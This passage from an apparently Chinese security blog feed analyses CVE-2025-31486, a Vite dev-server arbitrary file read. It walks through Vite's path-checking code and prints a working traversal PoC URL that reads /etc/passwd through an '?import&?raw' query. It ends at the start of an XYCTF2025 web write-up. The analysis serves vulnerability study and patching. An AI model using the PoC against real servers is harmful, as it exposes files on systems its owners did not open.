class="line"><span class="params">  <span class="attr">url</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">server</span>: <span class="title class_">ViteDevServer</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">res</span>: <span class="title class_">ServerResponse</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">next</span>: <span class="title class_">Connect</span>.<span class="title class_">NextFunction</span>,</span></span><br><span class="line"><span class="params"></span>): <span class="built_in">boolean</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">isFileServingAllowed</span>(url, server)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">isFileReadable</span>(<span class="title function_">cleanUrl</span>(url))) &#123;</span><br><span class="line">    <span class="keyword">const</span> urlMessage = <span class="string">`The request url &quot;<span class="subst">$&#123;url&#125;</span>&quot; is outside of Vite serving allow list.`</span></span><br><span class="line">    <span class="keyword">const</span> hintMessage = <span class="string">`</span></span><br><span class="line"><span class="string"><span class="subst">$&#123;server.config.server.fs.allow.map((i) =&gt; <span class="string">`- <span class="subst">$&#123;i&#125;</span>`</span>).join(<span class="string">&#x27;\n&#x27;</span>)&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Refer to docs https://vite.dev/config/server-options.html#server-fs-allow for configurations and more details.`</span></span><br><span class="line"></span><br><span class="line">    server.<span class="property">config</span>.<span class="property">logger</span>.<span class="title function_">error</span>(urlMessage)</span><br><span class="line">    server.<span class="property">config</span>.<span class="property">logger</span>.<span class="title function_">warnOnce</span>(hintMessage + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    res.<span class="property">statusCode</span> = <span class="number">403</span></span><br><span class="line">    res.<span class="title function_">write</span>(<span class="title function_">renderRestrictedErrorHTML</span>(urlMessage + <span class="string">&#x27;\n&#x27;</span> + hintMessage))</span><br><span class="line">    res.<span class="title function_">end</span>()</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// if the file doesn&#x27;t exist, we shouldn&#x27;t restrict this path as it can</span></span><br><span class="line">    <span class="comment">// be an API call. Middlewares would issue a 404 if the file isn&#x27;t handled</span></span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们要如何使其return一个true呢？发现只有一个isFileServingAllowed方法有机会！</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">isFileServingAllowed</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">url</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">server</span>: <span class="title class_">ViteDevServer</span>,</span></span><br><span class="line"><span class="params"></span>): <span class="built_in">boolean</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">isFileServingAllowed</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">configOrUrl</span>: <span class="title class_">ResolvedConfig</span> | <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">urlOrServer</span>: <span class="built_in">string</span> | <span class="title class_">ViteDevServer</span>,</span></span><br><span class="line"><span class="params"></span>): <span class="built_in">boolean</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> config = (</span><br><span class="line">    <span class="keyword">typeof</span> urlOrServer === <span class="string">&#x27;string&#x27;</span> ? configOrUrl : urlOrServer.<span class="property">config</span></span><br><span class="line">  ) <span class="keyword">as</span> <span class="title class_">ResolvedConfig</span></span><br><span class="line">  <span class="keyword">const</span> url = (</span><br><span class="line">    <span class="keyword">typeof</span> urlOrServer === <span class="string">&#x27;string&#x27;</span> ? urlOrServer : configOrUrl</span><br><span class="line">  ) <span class="keyword">as</span> <span class="built_in">string</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!config.<span class="property">server</span>.<span class="property">fs</span>.<span class="property">strict</span>) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">  <span class="keyword">const</span> filePath = <span class="title function_">fsPathFromUrl</span>(url)</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">isFileLoadingAllowed</span>(config, filePath)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处的关键点其实在于：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> filePath = <span class="title function_">fsPathFromUrl</span>(url)</span><br><span class="line"><span class="keyword">return</span> <span class="title function_">isFileLoadingAllowed</span>(config, filePath)</span><br></pre></td></tr></table></figure><p>跟进一下<code>fsPathFromUrl</code>看看</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">fsPathFromUrl</span>(<span class="params"><span class="attr">url</span>: <span class="built_in">string</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">fsPathFromId</span>(<span class="title function_">cleanUrl</span>(url))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先清洗一下url再<code>fsPathFromId</code>一下。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> postfixRE = <span class="regexp">/[?#].*$/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">cleanUrl</span>(<span class="params"><span class="attr">url</span>: <span class="built_in">string</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> url.<span class="title function_">replace</span>(postfixRE, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>cleanUrl</code>会使用正则处理url中的第一个<code>?</code>或者<code>#</code>开始的到结尾的部分进行移除。接着我们再看看<code>fsPathFromId</code>，它的作用是将一个模块 ID（通常来自 import 语句）转换为文件系统路径（filesystem path）。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="variable constant_">FS_PREFIX</span> = <span class="string">`/@fs/`</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">fsPathFromId</span>(<span class="params"><span class="attr">id</span>: <span class="built_in">string</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> fsPath = <span class="title function_">normalizePath</span>(</span><br><span class="line">    id.<span class="title function_">startsWith</span>(<span class="variable constant_">FS_PREFIX</span>) ? id.<span class="title function_">slice</span>(<span class="variable constant_">FS_PREFIX</span>.<span class="property">length</span>) : id,</span><br><span class="line">  )</span><br><span class="line">  <span class="keyword">return</span> fsPath[<span class="number">0</span>] === <span class="string">&#x27;/&#x27;</span> || <span class="variable constant_">VOLUME_RE</span>.<span class="title function_">test</span>(fsPath) ? fsPath : <span class="string">`/<span class="subst">$&#123;fsPath&#125;</span>`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里解释一下<code>normalizePath</code></p><ul><li>将路径中的反斜杠 <code>\</code> 替换为正斜杠 <code>/</code>（Windows 兼容）。</li><li>移除多余的 <code>/</code>（如 <code>a//b</code> → <code>a/b</code>）。</li><li>解析相对路径符号（如 <code>./</code> 或 <code>../</code>）。</li></ul><p>接下来我们看看isFileLoadingAllowed函数，它主要用于 <strong>检查某个文件路径是否被允许加载</strong>。</p><ul><li><p><strong><code>fs.strict</code><strong>：若为 <code>false</code>（非严格模式），</strong>直接允许加载所有文件</strong>（跳过后续检查）。</p></li><li><p>**<code>fsDenyGlob</code>**：一个匹配函数，检查文件路径是否命中黑名单（如敏感文件 <code>**/.env</code>、<code>**/node_modules/**</code>）。</p></li><li><p>**<code>safeModulePaths</code>**：一个 <code>Set</code> 集合，存放明确允许加载的路径（如项目源码目录）。</p></li><li><p>**<code>fs.allow</code>**：一个数组，包含允许的路径规则（如 <code>[&#39;/src&#39;, &#39;/public&#39;]</code>）。</p></li><li><p>**<code>isUriInFilePath</code>**：辅助函数，检查 <code>filePath</code> 是否在某个允许的路径下（如 <code>/src/utils.js</code> 匹配 <code>/src</code>）。</p></li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">isFileLoadingAllowed</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">config</span>: <span class="title class_">ResolvedConfig</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">filePath</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params"></span>): <span class="built_in">boolean</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; fs &#125; = config.<span class="property">server</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="property">strict</span>) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (config.<span class="title function_">fsDenyGlob</span>(filePath)) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (config.<span class="property">safeModulePaths</span>.<span class="title function_">has</span>(filePath)) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fs.<span class="property">allow</span>.<span class="title function_">some</span>(<span class="function">(<span class="params">uri</span>) =&gt;</span> <span class="title function_">isUriInFilePath</span>(uri, filePath))) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们便是在此处返回true的！因为我们自己的根目录是被允许的！</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fs.<span class="property">allow</span>.<span class="title function_">some</span>(<span class="function">(<span class="params">uri</span>) =&gt;</span> <span class="title function_">isUriInFilePath</span>(uri, filePath))) <span class="keyword">return</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>但是通过目录验证后，后续的处理逻辑却又是使用我们原始的url进行处理。</p><h3 id="跟一边poc"><a href="#跟一边poc" class="headerlink" title="跟一边poc"></a>跟一边poc</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.79.128:5173/@fs/usr/src/node_modules/vite/?/../../../../../etc/passwd?import&amp;?raw</span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  url = <span class="built_in">decodeURI</span>(<span class="title function_">removeTimestampQuery</span>(req.<span class="property">url</span>!)).<span class="title function_">replace</span>(</span><br><span class="line">    <span class="variable constant_">NULL_BYTE_PLACEHOLDER</span>,</span><br><span class="line">    <span class="string">&#x27;\0&#x27;</span>,</span><br><span class="line">  )</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">next</span>(e)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里什么都没remove掉，继续跟</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> urlWithoutTrailingQuerySeparators = url.<span class="title function_">replace</span>(</span><br><span class="line">        trailingQuerySeparatorsRE,</span><br><span class="line">        <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">      )</span><br></pre></td></tr></table></figure><p>然后进入到if判断中：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line">        (rawRE.<span class="title function_">test</span>(urlWithoutTrailingQuerySeparators) ||</span><br><span class="line">          urlRE.<span class="title function_">test</span>(urlWithoutTrailingQuerySeparators) ||</span><br><span class="line">          inlineRE.<span class="title function_">test</span>(urlWithoutTrailingQuerySeparators)) &amp;&amp;</span><br><span class="line">        !<span class="title function_">ensureServingAccess</span>(</span><br><span class="line">          urlWithoutTrailingQuerySeparators,</span><br><span class="line">          server,</span><br><span class="line">          res,</span><br><span class="line">          next,</span><br><span class="line">        )</span><br><span class="line">      ) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>这里在<code>rawRE.test</code>便已经为<code>true</code>，那么就会进入<code>ensureServingAccess</code>判断。这时我们的url为<code>/@fs/usr/src/node_modules/vite/?/../../../../../etc/passwd?import&amp;?raw</code></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_">isFileServingAllowed</span>(url, server)) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> filePath = <span class="title function_">fsPathFromUrl</span>(url)</span><br></pre></td></tr></table></figure><p>经过<code>fsPathFromUrl</code>的<code>cleanurl</code>后url变成了<code>/@fs/usr/src/node_modules/vite/</code>。<code>fsPathFromId</code>可以理解为一种规范化，url还是上面那样。</p><p>接着进入了<code>isFileLoadingAllowed</code>方法，我们关注下面这段代码：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fs.<span class="property">allow</span>.<span class="title function_">some</span>(<span class="function">(<span class="params">uri</span>) =&gt;</span> <span class="title function_">isUriInFilePath</span>(uri, filePath))) <span class="keyword">return</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>检查某个文件路径是否被允许加载，我们跟进<code>allow</code>看看：</p><img src="/2025/04/10/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31486/image-20250410183106447.png" class="" title="This is an example image"><p>继续跟进<code>allow</code></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="attr">server</span>: <span class="title class_">ResolvedServerOptions</span> = &#123;</span><br><span class="line">  ..._server,</span><br><span class="line">  <span class="attr">fs</span>: &#123;</span><br><span class="line">    ..._server.<span class="property">fs</span>,</span><br><span class="line">    <span class="comment">// run searchForWorkspaceRoot only if needed</span></span><br><span class="line">    <span class="attr">allow</span>: raw?.<span class="property">fs</span>?.<span class="property">allow</span> ?? [<span class="title function_">searchForWorkspaceRoot</span>(root)],</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">sourcemapIgnoreList</span>:</span><br><span class="line">    _server.<span class="property">sourcemapIgnoreList</span> === <span class="literal">false</span></span><br><span class="line">      ? <span class="function">() =&gt;</span> <span class="literal">false</span></span><br><span class="line">      : _server.<span class="property">sourcemapIgnoreList</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看这段<code>allow: raw?.fs?.allow ?? [searchForWorkspaceRoot(root)]</code></p><p>定义允许访问的文件系统路径列表（安全限制）。</p><ul><li>**<code>raw?.fs?.allow</code>**：如果用户显式配置了 <code>raw.fs.allow</code>，则直接使用。</li><li>**默认值 <code>[searchForWorkspaceRoot(root)]</code>**：若未配置，则自动搜索工作区根目录并设为唯一允许路径。<ul><li><code>searchForWorkspaceRoot(root)</code>：Vite 内部函数，从项目根目录（<code>root</code>）向上查找包含 <code>pnpm-workspace.yaml</code> 或 <code>lerna.json</code> 的目录（适用于 monorepo）。</li><li>返回的路径会被添加到 <code>fs.allow</code> 数组中（例如 <code>[&#39;/Users/your/project&#39;]</code>）。</li></ul></li></ul><p>那么网站的路径就是默认允许的！这也是我们的poc需要用网站路径的原因，他不能是随机的！！！</p><p>然后我们就通过了<code>ensureServingAccess</code>，url以最初的poc继续往下走：</p><p><code>http://192.168.79.128:5173/@fs/usr/src/node_modules/vite/?/../../../../../etc/passwd?import&amp;?raw</code></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line">        req.<span class="property">headers</span>[<span class="string">&#x27;sec-fetch-dest&#x27;</span>] === <span class="string">&#x27;script&#x27;</span> ||</span><br><span class="line">        <span class="title function_">isJSRequest</span>(url) ||</span><br><span class="line">        <span class="title function_">isImportRequest</span>(url) ||</span><br><span class="line">        <span class="title function_">isCSSRequest</span>(url) ||</span><br><span class="line">        <span class="title function_">isHTMLProxy</span>(url)</span><br><span class="line">      )</span><br></pre></td></tr></table></figure><p>毋庸置疑，通过了<code>isImportRequest</code>，然后进入：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="title function_">removeImportQuery</span>(url)</span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> importQueryRE = <span class="regexp">/(\?|&amp;)import=?(?:&amp;|$)/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">removeImportQuery</span>(<span class="params"><span class="attr">url</span>: <span class="built_in">string</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> url.<span class="title function_">replace</span>(importQueryRE, <span class="string">&#x27;$1&#x27;</span>).<span class="title function_">replace</span>(trailingSeparatorRE, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>去除掉了<code>import</code></p><p>变成了<code>/@fs/usr/src/node_modules/vite/?/../../../../../etc/passwd??raw</code></p><p>然后进入了</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="title function_">unwrapId</span>(url)</span><br></pre></td></tr></table></figure><p>这里没有变化，继续往下看。接着进入了<code>transformRequest</code>，再进入<code>doTransform</code>，然后又进行了一次<code>removeTimestampQuery</code>，没有变化。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable language_">module</span> = <span class="keyword">await</span> environment.<span class="property">moduleGraph</span>.<span class="title function_">getModuleByUrl</span>(url)</span><br></pre></td></tr></table></figure><p>获得了id</p><p>接着进入<code>loadAndTransform</code></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> result = <span class="title function_">loadAndTransform</span>(</span><br><span class="line">  environment,</span><br><span class="line">  id,</span><br><span class="line">  url,</span><br><span class="line">  options,</span><br><span class="line">  timestamp,</span><br><span class="line">  <span class="variable language_">module</span>,</span><br><span class="line">  resolved,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const loadResult = await pluginContainer.load(id)</span><br></pre></td></tr></table></figure><p>然后我们进入<code>load()</code></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="title function_">load</span>(<span class="params">id</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (id[<span class="number">0</span>] === <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// Rollup convention, this id should be handled by the</span></span><br><span class="line">    <span class="comment">// plugin that marked it with \0</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// raw requests, read from disk</span></span><br><span class="line">  <span class="keyword">if</span> (rawRE.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">    <span class="keyword">const</span> file = <span class="title function_">checkPublicFile</span>(id, config) || <span class="title function_">cleanUrl</span>(id)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">addWatchFile</span>(file)</span><br><span class="line">    <span class="comment">// raw query, read file and return as string</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">`export default <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(</span></span></span><br><span class="line"><span class="subst"><span class="string">      <span class="keyword">await</span> fsp.readFile(file, <span class="string">&#x27;utf-8&#x27;</span>),</span></span></span><br><span class="line"><span class="subst"><span class="string">    )&#125;</span>`</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!urlRE.<span class="title function_">test</span>(id) &amp;&amp; !config.<span class="title function_">assetsInclude</span>(<span class="title function_">cleanUrl</span>(id))) &#123;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  id = <span class="title function_">removeUrlQuery</span>(id)</span><br><span class="line">  <span class="keyword">let</span> url = <span class="keyword">await</span> <span class="title function_">fileToUrl</span>(<span class="variable language_">this</span>, id)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Inherit HMR timestamp if this asset was invalidated</span></span><br><span class="line">  <span class="keyword">if</span> (!url.<span class="title function_">startsWith</span>(<span class="string">&#x27;data:&#x27;</span>) &amp;&amp; <span class="variable language_">this</span>.<span class="property">environment</span>.<span class="property">mode</span> === <span class="string">&#x27;dev&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> mod = <span class="variable language_">this</span>.<span class="property">environment</span>.<span class="property">moduleGraph</span>.<span class="title function_">getModuleById</span>(id)</span><br><span class="line">    <span class="keyword">if</span> (mod &amp;&amp; mod.<span class="property">lastHMRTimestamp</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      url = <span class="title function_">injectQuery</span>(url, <span class="string">`t=<span class="subst">$&#123;mod.lastHMRTimestamp&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">code</span>: <span class="string">`export default <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(encodeURIPath(url))&#125;</span>`</span>,</span><br><span class="line">    <span class="comment">// Force rollup to keep this module from being shared between other entry points if it&#x27;s an entrypoint.</span></span><br><span class="line">    <span class="comment">// If the resulting chunk is empty, it will be removed in generateBundle.</span></span><br><span class="line">    <span class="attr">moduleSideEffects</span>:</span><br><span class="line">      config.<span class="property">command</span> === <span class="string">&#x27;build&#x27;</span> &amp;&amp; <span class="variable language_">this</span>.<span class="title function_">getModuleInfo</span>(id)?.<span class="property">isEntry</span></span><br><span class="line">        ? <span class="string">&#x27;no-treeshake&#x27;</span></span><br><span class="line">        : <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">meta</span>: config.<span class="property">command</span> === <span class="string">&#x27;build&#x27;</span> ? &#123; <span class="string">&#x27;vite:asset&#x27;</span>: <span class="literal">true</span> &#125; : <span class="literal">undefined</span>,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>通过了<code>rawRE.test</code>，没有防御目录穿越，导致了任意文件读取！</p>]]></content>
      
      
      <categories>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF2025 Web wp</title>
      <link href="/2025/04/09/XYCTF2025-Web-wp/"/>
      <url>/2025/04/09/XYCTF2025-Web-wp/</url>
      
        <content type="html"><![CDATA[<p>由于比赛的时候刚好遇到值班，所以随便打了打。。</p><h2 id="fate"><a href="#fate" class="headerlink" title="fate"></a>fate</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span 